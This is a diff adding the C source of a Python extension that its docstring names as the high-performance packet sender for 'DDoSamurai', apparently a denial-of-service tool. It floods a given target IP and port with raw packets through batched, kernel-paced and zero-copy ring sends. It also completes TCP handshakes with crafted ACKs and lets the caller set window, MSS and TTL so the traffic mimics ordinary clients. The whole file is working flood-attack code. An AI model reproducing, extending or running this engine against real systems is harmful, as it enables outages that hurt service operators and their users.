@@ -1,0 +1,722 @@
+#define PY_SSIZE_T_CLEAN
+#include <Python.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/uio.h>
+#include <unistd.h> 
+#include <fcntl.h>
+#include <net/if.h>
+#include <linux/if_packet.h>
+#include <net/ethernet.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <poll.h>
+#include <sched.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <time.h>
+#include <linux/net_tstamp.h>
+#include <linux/errqueue.h>
+
+/* SO_TXTIME support (kernel >= 4.19) */
+#ifndef SO_TXTIME
+#define SO_TXTIME 61
+#endif
+#ifndef SCM_TXTIME
+#define SCM_TXTIME SO_TXTIME
+#endif
+#ifndef SOF_TXTIME_DEADLINE_MODE
+#define SOF_TXTIME_DEADLINE_MODE   (1 << 0)
+#endif
+#ifndef SOF_TXTIME_REPORT_ERRORS
+#define SOF_TXTIME_REPORT_ERRORS   (1 << 1)
+#endif
+
+#define BATCH_SIZE 1024
+#define STATE_TABLE_SIZE 65536
+#define MAX_PACKET_SIZE 2048
+
+// --- TCP State Table ---
+typedef struct {
+    uint32_t src_ip;
+    uint32_t dst_ip;
+    uint16_t src_port;
+    uint16_t dst_port;
+    uint32_t seq;
+    uint32_t ack;
+    uint8_t state; // 0: CLOSED, 1: SYN_SENT, 2: ESTABLISHED
+    uint32_t last_seen;
+    uint16_t window_size;
+    uint16_t mss;
+    uint8_t ttl;
+} tcp_state_t;
+
+static tcp_state_t state_table[STATE_TABLE_SIZE];
+static pthread_mutex_t state_mutex = PTHREAD_MUTEX_INITIALIZER;
+
+static inline uint32_t hash_state(uint32_t src_ip, uint16_t src_port) {
+    // Improved hash function (Murmur-like mixing)
+    uint32_t h = src_ip;
+    h ^= (h >> 16);
+    h *= 0x85ebca6b;
+    h ^= (h >> 13);
+    h *= 0xc2b2ae35;
+    h ^= (h >> 16);
+    h ^= src_port;
+    return h % STATE_TABLE_SIZE;
+}
+
+static void update_state(uint32_t src_ip, uint16_t src_port, uint32_t seq, uint32_t ack, uint8_t state, uint16_t window, uint16_t mss, uint8_t ttl) {
+    uint32_t idx = hash_state(src_ip, src_port);
+    pthread_mutex_lock(&state_mutex);
+    state_table[idx].src_ip = src_ip;
+    state_table[idx].src_port = src_port;
+    state_table[idx].seq = seq;
+    state_table[idx].ack = ack;
+    state_table[idx].state = state;
+    state_table[idx].last_seen = (uint32_t)time(NULL);
+    state_table[idx].window_size = window;
+    state_table[idx].mss = mss;
+    state_table[idx].ttl = ttl;
+    pthread_mutex_unlock(&state_mutex);
+}
+
+// --- TX_RING Context (Persistent Mapping) ---
+typedef struct {
+    int sock;
+    char* map;
+    size_t ring_size;
+    struct tpacket_req req;
+    char iface[IFNAMSIZ];
+    int is_setup;
+    unsigned int frame_idx;
+} ring_context_t;
+
+static ring_context_t tx_ring_ctx = { .is_setup = 0, .sock = -1, .map = MAP_FAILED };
+
+// --- Checksum Helpers ---
+static uint16_t checksum(uint8_t *ptr, int nbytes) {
+    uint32_t sum = 0;
+    for (int i = 0; i < nbytes; i += 2) {
+        if (i + 1 < nbytes) {
+            sum += (ptr[i] << 8) | ptr[i+1];
+        } else {
+            sum += (ptr[i] << 8);
+        }
+    }
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    return (uint16_t)~sum;
+}
+
+static uint16_t tcp_checksum(uint8_t *ip_header, uint8_t *tcp_header, int tcp_len) {
+    uint32_t sum = 0;
+    uint8_t *src_ip = ip_header + 12;
+    uint8_t *dst_ip = ip_header + 16;
+    
+    sum += (src_ip[0] << 8) | src_ip[1];
+    sum += (src_ip[2] << 8) | src_ip[3];
+    sum += (dst_ip[0] << 8) | dst_ip[1];
+    sum += (dst_ip[2] << 8) | dst_ip[3];
+    sum += 6; // Protocol
+    sum += tcp_len;
+    
+    for (int i = 0; i < tcp_len; i += 2) {
+        if (i + 1 < tcp_len) {
+            sum += (tcp_header[i] << 8) | tcp_header[i+1];
+        } else {
+            sum += (tcp_header[i] << 8);
+        }
+    }
+    
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    return (uint16_t)~sum;
+}
+
+static PyObject* get_states_batch(PyObject* self, PyObject* args) {
+    uint32_t src_ip;
+    uint16_t start_port;
+    uint32_t count;
+    if (!PyArg_ParseTuple(args, "IHI", &src_ip, &start_port, &count)) return NULL;
+
+    PyObject* seq_list = PyList_New(count);
+    PyObject* ack_list = PyList_New(count);
+    PyObject* state_list = PyList_New(count);
+    PyObject* window_list = PyList_New(count);
+    PyObject* mss_list = PyList_New(count);
+    PyObject* ttl_list = PyList_New(count);
+
+    pthread_mutex_lock(&state_mutex);
+    for (uint32_t i = 0; i < count; i++) {
+        uint16_t port = start_port + (i % 64512);
+        uint32_t idx = hash_state(src_ip, port);
+        
+        uint32_t seq = 0, ack = 0;
+        uint8_t state = 0;
+        uint16_t window = 0, mss = 0;
+        uint8_t ttl = 0;
+        
+        if (state_table[idx].src_ip == src_ip && state_table[idx].src_port == port) {
+            seq = state_table[idx].seq;
+            ack = state_table[idx].ack;
+            state = state_table[idx].state;
+            window = state_table[idx].window_size;
+            mss = state_table[idx].mss;
+            ttl = state_table[idx].ttl;
+        }
+        
+        PyList_SetItem(seq_list, i, PyLong_FromUnsignedLong(seq));
+        PyList_SetItem(ack_list, i, PyLong_FromUnsignedLong(ack));
+        PyList_SetItem(state_list, i, PyLong_FromUnsignedLong(state));
+        PyList_SetItem(window_list, i, PyLong_FromUnsignedLong(window));
+        PyList_SetItem(mss_list, i, PyLong_FromUnsignedLong(mss));
+        PyList_SetItem(ttl_list, i, PyLong_FromUnsignedLong(ttl));
+    }
+    pthread_mutex_unlock(&state_mutex);
+
+    return Py_BuildValue("OOOOOO", seq_list, ack_list, state_list, window_list, mss_list, ttl_list);
+}
+
+static PyObject* get_tcp_state(PyObject* self, PyObject* args) {
+    uint32_t src_ip;
+    uint16_t src_port;
+    if (!PyArg_ParseTuple(args, "IH", &src_ip, &src_port)) return NULL;
+
+    uint32_t seq = 0, ack = 0;
+    uint8_t state = 0;
+    uint16_t window = 0, mss = 0;
+    uint8_t ttl = 0;
+
+    uint32_t idx = hash_state(src_ip, src_port);
+    pthread_mutex_lock(&state_mutex);
+    if (state_table[idx].src_ip == src_ip && state_table[idx].src_port == src_port) {
+        seq = state_table[idx].seq;
+        ack = state_table[idx].ack;
+        state = state_table[idx].state;
+        window = state_table[idx].window_size;
+        mss = state_table[idx].mss;
+        ttl = state_table[idx].ttl;
+    }
+    pthread_mutex_unlock(&state_mutex);
+
+    return Py_BuildValue("{s:I,s:I,s:i,s:H,s:H,s:b}", "seq", seq, "ack", ack, "state", state, "window", window, "mss", mss, "ttl", ttl);
+}
+
+// --- Global Mimicry Settings ---
+static uint16_t global_window_size = 64240;
+static uint16_t global_mss = 1460;
+static uint8_t global_ttl = 64;
+
+static PyObject* set_mimicry_settings(PyObject* self, PyObject* args) {
+    uint16_t window;
+    uint16_t mss;
+    uint8_t ttl;
+    if (!PyArg_ParseTuple(args, "HHb", &window, &mss, &ttl)) return NULL;
+    global_window_size = window;
+    global_mss = mss;
+    global_ttl = ttl;
+    Py_RETURN_NONE;
+}
+
+// --- RX_RING Handshake Handler ---
+static void* rx_thread_func(void* arg) {
+    char* iface = (char*)arg;
+    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (sock < 0) {
+        perror("RX socket creation failed");
+        free(iface);
+        return NULL;
+    }
+
+    struct tpacket_req req;
+    memset(&req, 0, sizeof(req));
+    req.tp_block_size = getpagesize();
+    req.tp_frame_size = req.tp_block_size;
+    req.tp_block_nr = 1024;
+    req.tp_frame_nr = 1024;
+
+    if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, (void*)&req, sizeof(req)) < 0) {
+        perror("setsockopt PACKET_RX_RING failed");
+        close(sock);
+        free(iface);
+        return NULL;
+    }
+
+    int ignore_outgoing = 1;
+    if (setsockopt(sock, SOL_PACKET, PACKET_IGNORE_OUTGOING, &ignore_outgoing, sizeof(ignore_outgoing)) < 0) {
+        // Not fatal
+    }
+
+    uint8_t* map = mmap(NULL, req.tp_block_size * req.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sock, 0);
+    if (map == MAP_FAILED) {
+        perror("mmap RX_RING failed");
+        close(sock);
+        free(iface);
+        return NULL;
+    }
+
+    struct sockaddr_ll sll;
+    memset(&sll, 0, sizeof(sll));
+    sll.sll_family = AF_PACKET;
+    sll.sll_protocol = htons(ETH_P_ALL);
+    sll.sll_ifindex = if_nametoindex(iface);
+    if (bind(sock, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
+        perror("bind RX socket failed");
+        munmap(map, req.tp_block_size * req.tp_block_nr);
+        close(sock);
+        free(iface);
+        return NULL;
+    }
+
+    unsigned int frame_idx = 0;
+    printf("[RX] Thread started on interface %s\n", iface);
+    fflush(stdout);
+
+    while (1) {
+        struct tpacket2_hdr* header = (struct tpacket2_hdr*)(map + (frame_idx * req.tp_frame_size));
+        if (header->tp_status & TP_STATUS_USER) {
+            uint8_t* pkt = (uint8_t*)header + header->tp_mac;
+            if (header->tp_len >= 54) {
+                uint8_t* ip = pkt + 14;
+                if (ip[9] == 6) { // TCP
+                    uint8_t ihl = (ip[0] & 0x0F) * 4;
+                    uint8_t* tcp = ip + ihl;
+                    uint8_t flags = tcp[13];
+                    
+                    if (flags == 0x12) { // SYN-ACK
+                        uint32_t src_ip = ntohl(*(uint32_t*)(ip + 12));
+                        uint32_t dst_ip = ntohl(*(uint32_t*)(ip + 16));
+                        uint16_t src_port = ntohs(*(uint16_t*)tcp);
+                        uint16_t dst_port = ntohs(*(uint16_t*)(tcp + 2));
+                        uint32_t seq = ntohl(*(uint32_t*)(tcp + 4));
+                        uint32_t ack = ntohl(*(uint32_t*)(tcp + 8));
+
+                        // Update State Table
+                        update_state(dst_ip, dst_port, ack, seq + 1, 2, global_window_size, global_mss, global_ttl); // ESTABLISHED
+                        
+                        // --- Send ACK ---
+                        uint8_t ack_pkt[54];
+                        memset(ack_pkt, 0, 54);
+                        memcpy(ack_pkt, pkt + 6, 6); 
+                        memcpy(ack_pkt + 6, pkt, 6); 
+                        *(uint16_t*)(ack_pkt + 12) = htons(0x0800);
+                        ack_pkt[14] = 0x45;
+                        *(uint16_t*)(ack_pkt + 16) = htons(40);
+                        ack_pkt[22] = global_ttl; 
+                        ack_pkt[23] = 6;  
+                        *(uint32_t*)(ack_pkt + 26) = htonl(dst_ip);
+                        *(uint32_t*)(ack_pkt + 30) = htonl(src_ip);
+                        *(uint16_t*)(ack_pkt + 34) = htons(dst_port);
+                        *(uint16_t*)(ack_pkt + 36) = htons(src_port);
+                        *(uint32_t*)(ack_pkt + 38) = htonl(ack);
+                        *(uint32_t*)(ack_pkt + 42) = htonl(seq + 1);
+                        ack_pkt[46] = 0x50; 
+                        ack_pkt[47] = 0x10; 
+                        *(uint16_t*)(ack_pkt + 48) = htons(global_window_size);
+                        *(uint16_t*)(ack_pkt + 24) = htons(checksum(ack_pkt + 14, 20));
+                        *(uint16_t*)(ack_pkt + 50) = htons(tcp_checksum(ack_pkt + 14, ack_pkt + 34, 20));
+                        
+                        if (sendto(sock, ack_pkt, 54, 0, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
+                            // Ignore errors
+                        }
+                    }
+                }
+            }
+            header->tp_status = TP_STATUS_KERNEL;
+            frame_idx = (frame_idx + 1) % req.tp_frame_nr;
+        } else {
+            usleep(10);
+        }
+    }
+    free(iface);
+    return NULL;
+}
+
+static PyObject* start_rx_handler(PyObject* self, PyObject* args) {
+    char* iface;
+    if (!PyArg_ParseTuple(args, "s", &iface)) return NULL;
+    
+    pthread_t thread;
+    if (pthread_create(&thread, NULL, rx_thread_func, strdup(iface)) != 0) {
+        PyErr_SetString(PyExc_RuntimeError, "Failed to create RX thread");
+        return NULL;
+    }
+    pthread_detach(thread);
+    Py_RETURN_NONE;
+}
+
+// --- L3 Sender (sendmmsg) ---
+static PyObject* send_optimized(PyObject* self, PyObject* args) {
+    int sockfd;
+    Py_buffer view;
+    char* target_ip;
+    int target_port;
+    int packet_size;
+    int count;
+
+    if (!PyArg_ParseTuple(args, "iy*siii", &sockfd, &view, &target_ip, &target_port, &packet_size, &count)) {
+        return NULL;
+    }
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(target_port);
+    if (inet_pton(AF_INET, target_ip, &addr.sin_addr) <= 0) {
+        PyBuffer_Release(&view);
+        PyErr_SetString(PyExc_ValueError, "Invalid IP address");
+        return NULL;
+    }
+
+    struct mmsghdr msgs[BATCH_SIZE];
+    struct iovec iovecs[BATCH_SIZE];    
+    
+    memset(msgs, 0, sizeof(msgs));
+    memset(iovecs, 0, sizeof(iovecs));
+
+    int total_sent = 0;
+    char* data_ptr = (char*)view.buf;
+
+    for (int i = 0; i < count; ) {
+        int batch = 0;
+        while (batch < BATCH_SIZE && i < count) {
+            iovecs[batch].iov_base = data_ptr + (i * packet_size);
+            iovecs[batch].iov_len = packet_size;
+            
+            msgs[batch].msg_hdr.msg_name = &addr;
+            msgs[batch].msg_hdr.msg_namelen = sizeof(addr);
+            msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
+            msgs[batch].msg_hdr.msg_iovlen = 1;
+            
+            batch++;
+            i++;
+        }
+
+        int retval = sendmmsg(sockfd, msgs, batch, 0);
+        if (retval < 0) {
+            if (errno == EINTR) continue;
+             if (errno != EAGAIN && errno != EWOULDBLOCK) {
+                 break;
+             }
+        } else {
+            total_sent += retval;
+        }
+    }
+
+    PyBuffer_Release(&view);
+    return Py_BuildValue("i", total_sent);
+}
+
+// --- L3 Sender with SO_TXTIME (Kernel Pacing) ---
+static PyObject* send_optimized_txtime(PyObject* self, PyObject* args) {
+    int sockfd;
+    Py_buffer view;
+    char* target_ip;
+    int target_port;
+    int packet_size;
+    int count;
+    long long ipg_ns;  // inter-packet gap in nanoseconds
+
+    if (!PyArg_ParseTuple(args, "iy*siiiL", &sockfd, &view, &target_ip,
+                          &target_port, &packet_size, &count, &ipg_ns)) {
+        return NULL;
+    }
+
+    // Enable SO_TXTIME on the socket
+    struct {
+        int32_t clockid;
+        uint32_t flags;
+    } txtime_cfg;
+    txtime_cfg.clockid = CLOCK_TAI;
+    txtime_cfg.flags = SOF_TXTIME_REPORT_ERRORS;
+
+    if (setsockopt(sockfd, SOL_SOCKET, SO_TXTIME,
+                   &txtime_cfg, sizeof(txtime_cfg)) < 0) {
+        PyBuffer_Release(&view);
+        PyErr_SetString(PyExc_OSError, "SO_TXTIME not supported on this kernel");
+        return NULL;
+    }
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(target_port);
+    if (inet_pton(AF_INET, target_ip, &addr.sin_addr) <= 0) {
+        PyBuffer_Release(&view);
+        PyErr_SetString(PyExc_ValueError, "Invalid IP address");
+        return NULL;
+    }
+
+    int total_sent = 0;
+    int tx_errors = 0;
+    char* data_ptr = (char*)view.buf;
+
+    // Get initial TAI time
+    struct timespec ts_tai;
+    clock_gettime(CLOCK_TAI, &ts_tai);
+    uint64_t txtime = (uint64_t)ts_tai.tv_sec * 1000000000ULL +
+                      (uint64_t)ts_tai.tv_nsec;
+    // Schedule first packet 100µs from now (allow setup time)
+    txtime += 100000;
+
+    // Ancillary data buffer for SCM_TXTIME
+    char cmsgbuf[CMSG_SPACE(sizeof(uint64_t))];
+
+    Py_BEGIN_ALLOW_THREADS
+
+    for (int i = 0; i < count; i++) {
+        struct iovec iov;
+        iov.iov_base = data_ptr + ((uint64_t)i * packet_size);
+        iov.iov_len = packet_size;
+
+        memset(cmsgbuf, 0, sizeof(cmsgbuf));
+
+        struct msghdr msg;
+        memset(&msg, 0, sizeof(msg));
+        msg.msg_name = &addr;
+        msg.msg_namelen = sizeof(addr);
+        msg.msg_iov = &iov;
+        msg.msg_iovlen = 1;
+        msg.msg_control = cmsgbuf;
+        msg.msg_controllen = sizeof(cmsgbuf);
+
+        struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+        cmsg->cmsg_level = SOL_SOCKET;
+        cmsg->cmsg_type = SCM_TXTIME;
+        cmsg->cmsg_len = CMSG_LEN(sizeof(uint64_t));
+        *(uint64_t *)CMSG_DATA(cmsg) = txtime;
+
+        int ret = sendmsg(sockfd, &msg, 0);
+        if (ret > 0) {
+            total_sent++;
+        } else {
+            tx_errors++;
+            if (errno == EINVAL) {
+                // Packet too late — advance txtime and continue
+                clock_gettime(CLOCK_TAI, &ts_tai);
+                txtime = (uint64_t)ts_tai.tv_sec * 1000000000ULL +
+                         (uint64_t)ts_tai.tv_nsec + 10000;  // 10µs buffer
+            }
+        }
+
+        // Advance scheduled TX time by IPG
+        txtime += (uint64_t)ipg_ns;
+    }
+
+    Py_END_ALLOW_THREADS
+
+    PyBuffer_Release(&view);
+    return Py_BuildValue("{s:i,s:i}", "sent", total_sent, "tx_errors", tx_errors);
+}
+
+// --- Check SO_TXTIME Availability ---
+static PyObject* check_so_txtime(PyObject* self, PyObject* args) {
+    (void)self; (void)args;
+
+    int available = 0;
+    int has_tai = 0;
+
+    // Check SO_TXTIME
+    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd >= 0) {
+        struct {
+            int32_t clockid;
+            uint32_t flags;
+        } cfg;
+        cfg.clockid = CLOCK_TAI;
+        cfg.flags = SOF_TXTIME_REPORT_ERRORS;
+
+        if (setsockopt(fd, SOL_SOCKET, SO_TXTIME, &cfg, sizeof(cfg)) == 0) {
+            available = 1;
+        }
+        close(fd);
+    }
+
+    // Check CLOCK_TAI
+    struct timespec ts;
+    if (clock_gettime(CLOCK_TAI, &ts) == 0) {
+        has_tai = 1;
+    }
+
+    return Py_BuildValue("{s:i,s:i,s:i}",
+                         "so_txtime", available,
+                         "clock_tai", has_tai,
+                         "is_root", geteuid() == 0);
+}
+
+// --- L2 Sender (AF_PACKET TX_RING Zero-Copy) ---
+
+static int setup_tx_ring(const char* iface, int packet_size, const uint8_t* mac) {
+    if (tx_ring_ctx.is_setup) {
+        // If interface or packet size changed, we need to re-setup
+        if (strcmp(tx_ring_ctx.iface, iface) == 0 && tx_ring_ctx.req.tp_frame_size >= packet_size + TPACKET_ALIGN(sizeof(struct tpacket2_hdr))) {
+            return 0; 
+        }
+        // Cleanup old ring
+        if (tx_ring_ctx.map != MAP_FAILED) munmap(tx_ring_ctx.map, tx_ring_ctx.ring_size);
+        if (tx_ring_ctx.sock >= 0) close(tx_ring_ctx.sock);
+        tx_ring_ctx.is_setup = 0;
+    }
+
+    tx_ring_ctx.sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (tx_ring_ctx.sock < 0) return -1;
+
+    memset(&tx_ring_ctx.req, 0, sizeof(tx_ring_ctx.req));
+    tx_ring_ctx.req.tp_block_size = getpagesize();
+    size_t frame_header_size = TPACKET_ALIGN(sizeof(struct tpacket2_hdr));  
+    while (tx_ring_ctx.req.tp_block_size < packet_size + frame_header_size) {
+        tx_ring_ctx.req.tp_block_size <<= 1;
+    }
+    tx_ring_ctx.req.tp_frame_size = tx_ring_ctx.req.tp_block_size;
+    tx_ring_ctx.req.tp_block_nr = 4096; 
+    tx_ring_ctx.req.tp_frame_nr = tx_ring_ctx.req.tp_block_nr;
+
+    if (setsockopt(tx_ring_ctx.sock, SOL_PACKET, PACKET_TX_RING, &tx_ring_ctx.req, sizeof(tx_ring_ctx.req)) < 0) {
+        close(tx_ring_ctx.sock);
+        return -1;
+    }
+
+    tx_ring_ctx.ring_size = tx_ring_ctx.req.tp_block_nr * tx_ring_ctx.req.tp_block_size;
+    tx_ring_ctx.map = mmap(NULL, tx_ring_ctx.ring_size, PROT_READ | PROT_WRITE, MAP_SHARED, tx_ring_ctx.sock, 0);
+    if (tx_ring_ctx.map == MAP_FAILED) {
+        close(tx_ring_ctx.sock);
+        return -1;
+    }
+
+    struct sockaddr_ll sll;
+    memset(&sll, 0, sizeof(sll));
+    sll.sll_family = AF_PACKET;
+    sll.sll_protocol = htons(ETH_P_ALL);
+    sll.sll_ifindex = if_nametoindex(iface);
+    sll.sll_halen = ETH_ALEN;
+    memcpy(sll.sll_addr, mac, 6);
+
+    if (bind(tx_ring_ctx.sock, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
+        munmap(tx_ring_ctx.map, tx_ring_ctx.ring_size);
+        close(tx_ring_ctx.sock);
+        return -1;
+    }
+
+    strncpy(tx_ring_ctx.iface, iface, IFNAMSIZ);
+    tx_ring_ctx.is_setup = 1;
+    tx_ring_ctx.frame_idx = 0;
+    return 0;
+}
+
+static PyObject* cleanup_ring(PyObject* self, PyObject* args) {
+    if (tx_ring_ctx.is_setup) {
+        if (tx_ring_ctx.map != MAP_FAILED) munmap(tx_ring_ctx.map, tx_ring_ctx.ring_size);
+        if (tx_ring_ctx.sock >= 0) close(tx_ring_ctx.sock);
+        tx_ring_ctx.is_setup = 0;
+        tx_ring_ctx.map = MAP_FAILED;
+        tx_ring_ctx.sock = -1;
+    }
+    Py_RETURN_NONE;
+}
+
+static PyObject* send_ring_optimized(PyObject* self, PyObject* args) {
+    char* iface;
+    Py_buffer view;
+    int packet_size;
+    int count;
+    Py_buffer mac_view;
+
+    if (!PyArg_ParseTuple(args, "sy*iiy*", &iface, &view, &packet_size, &count, &mac_view)) {
+        return NULL;
+    }
+
+    if (mac_view.len != 6) {
+        PyBuffer_Release(&view);
+        PyBuffer_Release(&mac_view);
+        PyErr_SetString(PyExc_ValueError, "MAC address must be 6 bytes");
+        return NULL;
+    }
+
+    if (setup_tx_ring(iface, packet_size, (uint8_t*)mac_view.buf) < 0) {
+        PyBuffer_Release(&view);
+        PyBuffer_Release(&mac_view);
+        PyErr_SetString(PyExc_OSError, "Failed to setup TX_RING");
+        return NULL;
+    }
+
+    int total_sent = 0;
+    char* data_ptr = (char*)view.buf;
+    size_t frame_header_size = TPACKET_ALIGN(sizeof(struct tpacket2_hdr));
+
+    struct pollfd pfd;
+    pfd.fd = tx_ring_ctx.sock;
+    pfd.events = POLLOUT;
+
+    for (int i = 0; i < count; ) {
+        struct tpacket2_hdr* header = (struct tpacket2_hdr*)(tx_ring_ctx.map + (tx_ring_ctx.frame_idx * tx_ring_ctx.req.tp_frame_size));
+        
+        int busy_loops = 1000 + (i % 2000); 
+        while (header->tp_status != TP_STATUS_AVAILABLE) {
+            if (busy_loops > 0) { busy_loops--; continue; }
+            poll(&pfd, 1, 1);
+            if (header->tp_status != TP_STATUS_AVAILABLE) {
+                 sendto(tx_ring_ctx.sock, NULL, 0, MSG_DONTWAIT, NULL, 0);
+            }
+        }
+
+        char* payload_ptr = (char*)header + frame_header_size;
+        memcpy(payload_ptr, data_ptr + (i * packet_size), packet_size);
+        
+        header->tp_len = packet_size;
+        header->tp_snaplen = packet_size;
+        header->tp_mac = frame_header_size;        
+        header->tp_net = frame_header_size + 14;   
+        header->tp_status = TP_STATUS_SEND_REQUEST;
+
+        int dynamic_batch = 128 + (i & 0xFF);
+        if ((i % dynamic_batch == 0) || (i == count - 1)) {
+            sendto(tx_ring_ctx.sock, NULL, 0, MSG_DONTWAIT, NULL, 0);
+        }
+
+        total_sent++;
+        i++;
+        tx_ring_ctx.frame_idx = (tx_ring_ctx.frame_idx + 1) % tx_ring_ctx.req.tp_frame_nr;
+    }
+
+    PyBuffer_Release(&view);
+    PyBuffer_Release(&mac_view);
+    return Py_BuildValue("i", total_sent);
+}
+
+// --- Module Definition ---
+static PyMethodDef FastSenderMethods[] = {
+    {"send_optimized", send_optimized, METH_VARARGS, "Send packets using sendmmsg (L3)"},
+    {"send_optimized_txtime", send_optimized_txtime, METH_VARARGS,
+     "Send packets using SO_TXTIME kernel pacing (L3).\n"
+     "Args: sockfd, buffer, target_ip, target_port, packet_size, count, ipg_ns\n"
+     "Returns: dict with 'sent' and 'tx_errors' counts."},
+    {"send_ring_optimized", send_ring_optimized, METH_VARARGS, "Send packets using AF_PACKET TX_RING (L2 Zero-Copy)"},
+    {"cleanup_ring", cleanup_ring, METH_VARARGS, "Cleanup persistent TX_RING context"},
+    {"get_tcp_state", get_tcp_state, METH_VARARGS, "Get TCP state from the state table"},
+    {"get_states_batch", get_states_batch, METH_VARARGS, "Get multiple TCP states in one call"},
+    {"start_rx_handler", start_rx_handler, METH_VARARGS, "Start the background RX handler thread"},
+    {"set_mimicry_settings", set_mimicry_settings, METH_VARARGS, "Set global TCP mimicry settings (Window, MSS, TTL)"},
+    {"check_so_txtime", check_so_txtime, METH_NOARGS,
+     "Check SO_TXTIME / CLOCK_TAI availability.\n"
+     "Returns: dict with 'so_txtime', 'clock_tai', 'is_root' keys."},
+    {NULL, NULL, 0, NULL}
+};
+
+static struct PyModuleDef fastsendermodule = {
+    PyModuleDef_HEAD_INIT,
+    "fast_sender",
+    "High performance packet sender module for DDoSamurai",
+    -1,
+    FastSenderMethods
+};
+
+PyMODINIT_FUNC PyInit_fast_sender(void) {
+    return PyModule_Create(&fastsendermodule);
+}
